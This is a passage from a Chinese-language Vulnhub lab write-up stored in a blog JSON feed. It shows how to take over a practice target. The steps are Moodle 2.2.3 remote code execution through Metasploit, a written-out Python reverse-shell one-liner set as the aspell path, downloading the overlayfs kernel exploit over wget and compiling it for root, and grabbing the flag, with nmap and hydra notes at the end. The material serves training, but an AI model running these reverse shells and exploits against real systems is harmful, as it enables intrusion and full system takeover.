BASE64 加密</p>\n<p>解密后：xWinter1995x!</p>\n<p>应该是得到了培训系统的管理员账号：admin  密码:xWinter1995x!</p>\n<p>尝试登录一下，成功～</p>\n<h2 id=\"2利用漏洞getshell反弹shell\"><a class=\"anchor\" href=\"#2利用漏洞getshell反弹shell\">#</a> 2. 利用漏洞 getshell，反弹 shell</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240514120620071.png\" alt=\"image-20240514120620071\" /></p>\n<p>可以知道 CMS：Moodle 的版本：2.2.3</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514120801418.png\" alt=\"image-20240514120801418\" /></p>\n<p>google 一下 moodle 2.2.3 exp cve</p>\n<p>漏洞详情：<a href=\"https://www.exploit-db.com/exploits/29324\">https://www.exploit-db.com/exploits/29324</a></p>\n<p>CVE：<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-3630\">2013-3630</a></p>\n<p>Description：</p>\n<p>Moodle through 2.5.2 allows remote authenticated administrators to execute arbitrary programs by configuring the aspell pathname and then triggering a spell-check operation within the TinyMCE editor.</p>\n<p>翻译：Moodle 到 2.5.2 允许远程身份验证管理员通过配置 aspell 路径名，然后在 TinyMCE 编辑器中触发拼写检查操作来执行任意程序。</p>\n<p>先用 msf 试一下：</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122244981.png\" alt=\"image-20240514122244981\" /></p>\n<p>搜索一下 Moodle，发现编号 1 就是刚才找的漏洞， <code>use 1</code>  使用这个攻击模块</p>\n<p><code>show options</code>  显示需要配置的选项</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122342560.png\" alt=\"image-20240514122342560\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122423785.png\" alt=\"image-20240514122423785\" /></p>\n<p>Required 显示 yes 的是需要配置的选项：</p>\n<p><code>set password xWinter1995x!</code></p>\n<p><code>set rhosts severnaya-station.com</code></p>\n<p><code>set targeturi /gnocertdir</code></p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122827293.png\" alt=\"image-20240514122827293\" /></p>\n<p>配置 payload</p>\n<p><code>set payload cmd/unix/reverse</code></p>\n<p><code>show options</code>  显示要 payload 配置选项</p>\n<p>设置 lhost，反弹 shell 需要回来找的 IP, 填本地 IP  <code>set lhost 192.168.222.132</code> （这里换了切到另一个 kali，所以 IP 与前面不同）</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514122950625.png\" alt=\"image-20240514122950625\" /></p>\n<p><code>run</code>  运行，失败了，错误的触发 payload</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 exploit<span class=\"token punctuation\">(</span>multi/http/moodle_spelling_binary_rce<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Started reverse TCP double handler on <span class=\"token number\">192.168</span>.222.132:4444 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Running automatic check <span class=\"token punctuation\">(</span><span class=\"token string\">\"set AutoCheck false\"</span> to disable<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> The target appears to be vulnerable. Exploitable Moodle version <span class=\"token number\">2.2</span> detected</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Authenticating as user: admin</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Getting session key to update spellchecker <span class=\"token keyword\">if</span> no session key was specified</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Updating spellchecker to use the system <span class=\"token function\">aspell</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Triggering payload</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span> Exploit aborted due to failure: payload-failed: Error triggering payload</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Exploit completed, but no session was created.</pre></td></tr></table></figure><p>看一下详情漏了什么点：<a href=\"https://www.exploit-db.com/exploits/29324\">https://www.exploit-db.com/exploits/29324</a></p>\n<p><img loading=\"lazy\" data-src=\"image-20240514123958479.png\" alt=\"image-20240514123958479\" /></p>\n<p>我们去系统里看看 editor_tinymce_spellengine 是否设置成 power shell 命令执行</p>\n<p>，果然没有改一下，默认是 Google Spell, 改成 PSpellShell</p>\n<p>Page path:</p>\n<pre><code>Home / ► Site administration / ► Plugins / ► Text editors / ► TinyMCE HTML editor\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514124605570.png\" alt=\"image-20240514124605570\" /></p>\n<p>回到 msf，再 run, 已经成功反弹 shell 了，权限是 www-data</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514124930903.png\" alt=\"image-20240514124930903\" /></p>\n<p>看看有没有 python，可以用 python 构建个 pty 伪终端，方便一些</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240514125711369.png\" alt=\"image-20240514125711369\" /></p>\n<p>另一种反弹方式，按照漏洞详情中那样配置 aspell 路径，触发拼写检查，也试试...</p>\n<p>先配置 aspell 路径:</p>\n<p>Page path:</p>\n<pre><code>Home / ► Site administration / ► Server / ► System paths\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514130924939.png\" alt=\"image-20240514130924939\" /></p>\n<p>改成：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.222.133\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></pre></td></tr></table></figure><p>使用 python 反弹 shell, 反向连接自己...</p>\n<p>nc 监听一下</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-vlp</span> <span class=\"token number\">6666</span>            </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>listening on <span class=\"token punctuation\">[</span>any<span class=\"token punctuation\">]</span> <span class=\"token number\">6666</span> <span class=\"token punctuation\">..</span>.</pre></td></tr></table></figure><p>找到拼写检查进行触发</p>\n<p>Page path：</p>\n<pre><code>Home / ► My profile / ► Blogs / ► Add a new entry\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240514125927652.png\" alt=\"image-20240514125927652\" /></p>\n<p>反弹成功，构建一下伪终端</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514132031609.png\" alt=\"image-20240514132031609\" /></p>\n<h2 id=\"3提权\"><a class=\"anchor\" href=\"#3提权\">#</a> 3. 提权</h2>\n<p><code>uname -a</code>  查看系统版本 ubuntu 3.13.0</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-a</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux ubuntu <span class=\"token number\">3.13</span>.0-32-generic <span class=\"token comment\">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$</pre></td></tr></table></figure><p>找一下 ubuntu 3.13.0 的 exp</p>\n<p>EDB-ID:37292</p>\n<p>CVE:2015-1328</p>\n<p><a href=\"https://www.exploit-db.com/exploits/37292\">https://www.exploit-db.com/exploits/37292</a></p>\n<p>Description:</p>\n<p>The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.</p>\n<p>在 Ubuntu 3.19.0-21.21 到 15.04 版本的 Linux (又名 Linux 内核) 包中的 overlayfs 实现没有正确地检查上层文件系统目录中文件创建的权限，这允许本地用户通过利用一个配置获得 root 访问权限，其中 overlayfs 在任意挂载名称空间中都是允许的。</p>\n<p><code>earchsploit 37292</code>  找一下 kali 中是不是自带这个 exp</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>earchsploit <span class=\"token number\">37292</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>------------------------------------------------------------------------------------ ---------------------------------</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> Exploit Title                                                                      <span class=\"token operator\">|</span>  Path</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>------------------------------------------------------------------------------------ ---------------------------------</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Linux Kernel <span class=\"token number\">3.13</span>.0 <span class=\"token operator\">&lt;</span> <span class=\"token number\">3.19</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">12.04</span>/14.04/14.10/15.04<span class=\"token punctuation\">)</span> - <span class=\"token string\">'overlayfs'</span> Local Pri <span class=\"token operator\">|</span> linux/local/37292.c</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>------------------------------------------------------------------------------------ ---------------------------------</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Shellcodes: No Results</pre></td></tr></table></figure><p>找到了把他复制出来</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c <span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p>看看目标系统有没有 gcc，exp 需要 gcc 编译</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514151350886.png\" alt=\"image-20240514151350886\" /></p>\n<p>发现对方服务器没有 gcc，改一下 exp, 将 gcc 改为 cc</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514151850099.png\" alt=\"image-20240514151850099\" /></p>\n<p>在 exp 所在目录开启一个 http 服务</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-m</span> SimpleHTTPServer <span class=\"token number\">8081</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Serving HTTP on <span class=\"token number\">0.0</span>.0.0 port <span class=\"token number\">8081</span> <span class=\"token punctuation\">..</span>.</pre></td></tr></table></figure><p>在反弹的 shell 上将 exp 下载到目标服务器</p>\n<p>一定要切换到 <code>/tmp</code>  目录，不然没权限</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /tmp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>www-data@ubuntu:/tmp$ <span class=\"token function\">wget</span> http://192.168.222.133:8081/37292.c</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">wget</span> http://192.168.222.133:8081/37292.c</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>--2024-05-14 00:25:00--  http://192.168.222.133:8081/37292.c</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Connecting to <span class=\"token number\">192.168</span>.222.133:8081<span class=\"token punctuation\">..</span>. connected.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>HTTP request sent, awaiting response<span class=\"token punctuation\">..</span>. <span class=\"token number\">200</span> OK</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Length: <span class=\"token number\">5120</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5</span>.0K<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>text/plain<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Saving to: <span class=\"token string\">'37292.c'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">100</span>%<span class=\"token punctuation\">[</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token number\">5,120</span>       --.-K/s   <span class=\"token keyword\">in</span> 0s      </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">2024</span>-05-14 00:25:00 <span class=\"token punctuation\">(</span><span class=\"token number\">1.87</span> GB/s<span class=\"token punctuation\">)</span> - <span class=\"token string\">'37292.c'</span> saved <span class=\"token punctuation\">[</span><span class=\"token number\">5120</span>/5120<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>编译 运行，成功获取 root 权限</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cc <span class=\"token number\">37292</span>.c <span class=\"token parameter variable\">-o</span> exp  <span class=\"token comment\"># 编译</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./exp              <span class=\"token comment\"># 运行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">id</span>                 <span class=\"token comment\"># 查看权限</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>,33<span class=\"token punctuation\">(</span>www-data<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 拥有 root 权限了</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240514152807565.png\" alt=\"image-20240514152807565\" /></p>\n<h2 id=\"4拿到flag\"><a class=\"anchor\" href=\"#4拿到flag\">#</a> 4. 拿到 flag</h2>\n<p>由前面信息收集所知，flag 在 root 目录下的隐藏文件</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514153323129.png\" alt=\"image-20240514153323129\" /></p>\n<p><code>568628e0d993b1973adc718237da6e93</code>  是个 md5 加密，解密后为 006</p>\n<p>访问 <code>http://severnaya-station.com/006-final/xvf7-flag/</code>  成功拿到 Flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240514153643918.png\" alt=\"image-20240514153643918\" /></p>\n<h2 id=\"5总结\"><a class=\"anchor\" href=\"#5总结\">#</a> 5. 总结</h2>\n<p>本次学到的内容</p>\n<ul>\n<li>nmap 的使用\n<ul>\n<li><code>-sS</code>   <code>-sV</code>   <code>-sP</code>   <code> -p-</code>   <code>-A</code>   <code>-T5</code></li>\n</ul>\n</li>\n<li>hydra 的使用\n<ul>\n<li><code>-l</code>   <code> -L</code></li>\n<li><code>-p</code>    <code>-P</code></li>\n<li><code>-s</code></li>\n<li><code>-vV</code></li>\n<li><code>-t</code></li>\n</ul>\n</li>\n<li>msf 一把梭</li>\n<li>图片隐写\n<ul>\n<li>exiftool</li>\n<li>binwalk</li>\n<li>strings</li>\n</ul>\n</li>\n<li>python 构建伪终端</li>\n<li>python 写反弹 shell</li>\n<li>getshell 思路</li>\n<li>提权思路</li>\n<li>渗透测基本思路</li>\n</ul>\n<h3 id=\"nmap用到的命令\"><a class=\"anchor\" href=\"#nmap用到的命令\">#</a> nmap 用到的命令</h3>\n<p><code>-sP</code>  表示主机存活性扫描。不扫描端口。</p>\n<p><code>-p&lt;port&gt;,&lt;port&gt;</code>  扫描指定端口。</p>\n<p><code>-Pn</code>  参数表示不进行主机存活性检测（Ping Scan），而是直接对目标进行端口扫描。</p>\n<p><code>-p-</code>  表示扫描所有端口，即从端口 1 到 65535 的所有端口都会被扫描。</p>\n<p><code>-sS</code> : 表示使用 SYN 扫描（SYN Scan）技术进行端口扫描。它利用 TCP 协议中的 SYN 标志来判断目标主机上的端口是否处于开放状态。</p>\n<p>相比于完全连接扫描（TCP 连接扫描），SYN 扫描的优势在于更快速和更隐蔽。因为 SYN 扫描不需要建立完整的 TCP 连接，只发送一个 SYN 包就能获取目标端口的响应，所以扫描速度更快，并且在目标主机的日志中留下的记录更少，更不容易被检测到。</p>\n<p>然而，一些防火墙和入侵检测系统（IDS）可能会监测到 SYN 扫描活动，并采取相应的防御措施，如限制 SYN 包的发送频率或阻止响应 SYN 包的端口。</p>\n<p><code>-sV</code> : 这个参数指定了进行版本检测（Version Detection）。在端口扫描的基础上， <code>-sV</code>  参数会尝试识别目标主机上运行的服务及其版本信息。</p>\n<p><code>-T5</code> : 这个参数指定了扫描的速度 / 敏感度级别。 <code>-T5</code>  表示使用最高的扫描速度和敏感度（Insane）。这会使扫描速度加快，但也会增加对目标网络和主机的负载和影响。</p>\n<p><code>-A</code>  参数是一个高级选项等价于 <code>-sV -sC -O -T4</code></p>\n<ul>\n<li><code>-sC</code> ：使用默认脚本进行扫描。这个选项会在扫描过程中使用 nmap 默认的脚本来进行漏洞检测和服务识别。</li>\n<li><code>-O</code> ：进行操作系统检测。这个选项会尝试识别目标主机所运行的操作系统类型和版本。</li>\n<li><code>-T4</code> ：设置扫描速度为 Aggressive。这个选项会使 nmap 以较快的速度执行扫描操作，但不会达到最高速度</li>\n</ul>\n<h3 id=\"hydra用到的命令\"><a class=\"anchor\" href=\"#hydra用到的命令\">#</a> hydra 用到的命令</h3>\n<p><code>-l</code>  后面跟用户名，不跟文件，只会匹配这一个用户名。</p>\n<p><code>-L</code>  后面跟文件，每行一个用户名，会匹配文件中的所有用户名。</p>\n<p><code>-p</code>  后面跟密码，不跟文件，只会匹配这一个密码</p>\n<p><code>-P</code>  后面跟文件，每行一个密码，会匹配文件中的所有密码。</p>\n<p><code>-s &lt;port&gt; &lt;server&gt;</code>  后面跟对应端口服务</p>\n<p><code>-vV</code>  显示每次匹配时的详细信息</p>\n",
            "tags": [
                "靶场",
                "Vulnhub靶场",
                "打靶",
                "Vulnhub"
            ]
        }
    ]
}